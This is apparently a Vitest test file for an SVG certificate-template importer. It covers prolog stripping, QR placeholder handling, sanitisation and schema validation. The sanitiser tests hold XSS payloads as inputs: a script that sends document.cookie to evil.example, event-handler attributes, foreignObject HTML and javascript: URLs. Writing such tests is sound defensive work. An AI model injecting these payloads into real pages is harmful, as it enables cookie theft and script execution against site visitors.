import { describe, expect, it } from "vitest";

import {
  normalizeTemplateSvg,
  sanitizeTemplateSvg,
  stripPrologAndComments,
  unwrapQrPlaceholder,
} from "./template-import";
import {
  externalReferencesIn,
  placeholdersIn,
  templateSchema,
} from "@/app/(dashboard)/admin/settings/templates/schema";

describe("stripPrologAndComments", () => {
  it("removes the XML prolog and generator comments", () => {
    const svg = `<?xml version="1.0" encoding="UTF-8"?>\n<!-- Generator: Adobe -->\n<svg><g/></svg>`;
    expect(stripPrologAndComments(svg)).toBe("<svg><g/></svg>");
  });

  it("removes a DOCTYPE carrying an internal entity subset", () => {
    // Illustrator's older exports. A `<!DOCTYPE[^>]*>` pattern stops at the
    // first `>` — the end of the first <!ENTITY> — leaving declarations and a
    // dangling `]>` in front of the root, which resvg rejects.
    const svg =
      `<?xml version="1.0"?>` +
      `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "svg11.dtd" [` +
      `<!ENTITY ns_ai "http://ns.adobe.com/AdobeIllustrator/10.0/">` +
      `<!ENTITY ns_graphs "http://ns.adobe.com/Graphs/1.0/">]>` +
      `<svg><g/></svg>`;
    expect(stripPrologAndComments(svg)).toBe("<svg><g/></svg>");
  });

  it("still removes a plain DOCTYPE with no subset", () => {
    expect(stripPrologAndComments(`<!DOCTYPE svg><svg/>`)).toBe("<svg/>");
  });
});

describe("unwrapQrPlaceholder", () => {
  it("moves the QR token out of its text wrapper, keeping the transform", () => {
    const svg =
      '<svg><text class="st2" transform="translate(62.65 466.25)"><tspan x="0" y="0">{{verification_qr}}</tspan></text></svg>';
    expect(unwrapQrPlaceholder(svg)).toBe(
      '<svg><g transform="translate(62.65 466.25)">{{verification_qr}}</g></svg>',
    );
  });

  it("carries over x/y positioning instead of dropping it", () => {
    // SVGO and several exporters emit x/y rather than a translate(). `<g>` has
    // no x/y, so honouring only the transform pinned the QR to the origin — on
    // top of the artwork in the corner of every certificate.
    const svg =
      '<svg><text x="62.65" y="466.25"><tspan>{{verification_qr}}</tspan></text></svg>';
    expect(unwrapQrPlaceholder(svg)).toContain(
      '<g transform="translate(62.65 466.25)">{{verification_qr}}</g>',
    );
  });

  it("unwraps a token sitting directly in a <text>, with no tspan", () => {
    const svg = '<svg><text transform="translate(1 2)">{{verification_qr}}</text></svg>';
    expect(unwrapQrPlaceholder(svg)).toContain(
      '<g transform="translate(1 2)">{{verification_qr}}</g>',
    );
  });

  it("accepts the short {{qr}} alias", () => {
    const out = unwrapQrPlaceholder(
      '<svg><text transform="translate(1 2)"><tspan>{{qr}}</tspan></text></svg>',
    );
    expect(out).toContain('<g transform="translate(1 2)">{{verification_qr}}</g>');
  });

  it("leaves a token already in a group alone", () => {
    const svg = '<svg><g transform="translate(1 2)">{{verification_qr}}</g></svg>';
    expect(normalizeTemplateSvg(svg)).toBe(svg);
  });

  it("leaves unrelated text elements untouched", () => {
    const svg = '<svg><text x="1" y="2"><tspan>{{course_title}}</tspan></text></svg>';
    expect(unwrapQrPlaceholder(svg)).toBe(svg);
  });
});

/**
 * A stored template is rendered into a certificate, frozen into an immutable
 * snapshot, and served from the PUBLIC verification page. Anything executable
 * in it would run for every visitor of a certificate's QR link, on the
 * platform's own origin, and could not be cleaned up afterwards.
 */
describe("sanitizeTemplateSvg", () => {
  it("removes a script element and its contents", () => {
    const out = sanitizeTemplateSvg(
      '<svg><script>fetch("https://evil.example/"+document.cookie)</script><g/></svg>',
    );
    expect(out).not.toContain("<script");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("<g/>");
  });

  it("removes a script smuggled in front of the root element", () => {
    const out = normalizeTemplateSvg('<script>alert(1)</script><svg>{{qr}}</svg>');
    expect(out.startsWith("<svg")).toBe(true);
    expect(out).not.toContain("alert(1)");
  });

  it("removes an unterminated script element", () => {
    expect(sanitizeTemplateSvg("<svg><script>alert(1)")).not.toContain("alert");
  });

  it("removes foreignObject, which can carry arbitrary HTML", () => {
    const out = sanitizeTemplateSvg(
      '<svg><foreignObject><body onload="alert(1)"/></foreignObject></svg>',
    );
    expect(out).not.toContain("foreignObject");
    expect(out).not.toContain("alert");
  });

  it("strips event-handler attributes, quoted, single-quoted and bare", () => {
    const out = sanitizeTemplateSvg(
      `<svg onload="alert(1)"><image onerror='alert(2)'/><animate onbegin=alert(3) /></svg>`,
    );
    expect(out).not.toMatch(/\son[a-z]+\s*=/i);
    expect(out).not.toContain("alert");
  });

  it("strips javascript: and data:text/html URLs", () => {
    const out = sanitizeTemplateSvg(
      `<svg><a xlink:href="javascript:alert(1)"/><a href='data:text/html,<script>x</script>'/></svg>`,
    );
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("data:text/html");
  });

  it("leaves legitimate artwork untouched", () => {
    const svg =
      '<svg viewBox="0 0 10 10"><path d="M0 0L1 1" fill="#3a4039"/><image href="data:image/jpeg;base64,AAA"/><text>{{participant_name}}</text></svg>';
    expect(sanitizeTemplateSvg(svg)).toBe(svg);
  });
});

describe("placeholdersIn", () => {
  it("lists each distinct token once, without braces", () => {
    expect(
      placeholdersIn("{{participant_name}} {{course_title}} {{course_title}}"),
    ).toEqual(["participant_name", "course_title"]);
  });

  it("returns nothing for an SVG whose text was converted to outlines", () => {
    expect(placeholdersIn('<svg><path d="M0 0L1 1"/></svg>')).toEqual([]);
  });
});

describe("externalReferencesIn", () => {
  it("flags a linked bitmap", () => {
    expect(externalReferencesIn('<image xlink:href="photo_2026-07-23.jpg"/>')).toEqual([
      "photo_2026-07-23.jpg",
    ]);
  });

  it("flags a single-quoted reference too", () => {
    expect(externalReferencesIn("<image href='photo.jpg'/>")).toEqual(["photo.jpg"]);
  });

  it("flags a src attribute", () => {
    expect(externalReferencesIn('<image src="photo.png"/>')).toEqual(["photo.png"]);
  });

  it("accepts embedded data URIs and internal fragments", () => {
    expect(
      externalReferencesIn(
        '<image href="data:image/jpeg;base64,AAA"/><path clip-path="x" href="#b"/>',
      ),
    ).toEqual([]);
  });
});

describe("templateSchema", () => {
  const valid = {
    name: "Shoulder Biomechanics 01/04",
    svg_template:
      '<svg viewBox="0 0 10 10"><text>{{participant_name}}</text><text>{{verification_qr}}</text></svg>',
    active: true,
  };

  it("accepts a well-formed template", () => {
    expect(templateSchema.safeParse(valid).success).toBe(true);
  });

  it("stores the NORMALIZED svg, not the raw paste", () => {
    const parsed = templateSchema.safeParse({
      ...valid,
      svg_template: `<?xml version="1.0"?><svg><text>{{participant_name}}</text><script>alert(1)</script></svg>`,
    });
    expect(parsed.success).toBe(true);
    if (parsed.success) {
      expect(parsed.data.svg_template.startsWith("<svg")).toBe(true);
      expect(parsed.data.svg_template).not.toContain("alert(1)");
    }
  });

  it("rejects an SVG whose text was converted to outlines", () => {
    const parsed = templateSchema.safeParse({
      ...valid,
      svg_template: '<svg viewBox="0 0 10 10"><path d="M0 0L1 1"/></svg>',
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects a template with placeholders but no name slot", () => {
    const parsed = templateSchema.safeParse({
      ...valid,
      svg_template: "<svg><text>{{course_title}}</text></svg>",
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects a template linking an external image", () => {
    const parsed = templateSchema.safeParse({
      ...valid,
      svg_template:
        '<svg><image href="photo.jpg"/><text>{{participant_name}}</text></svg>',
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects something that is not an SVG at all", () => {
    const parsed = templateSchema.safeParse({ ...valid, svg_template: "hello" });
    expect(parsed.success).toBe(false);
  });
});
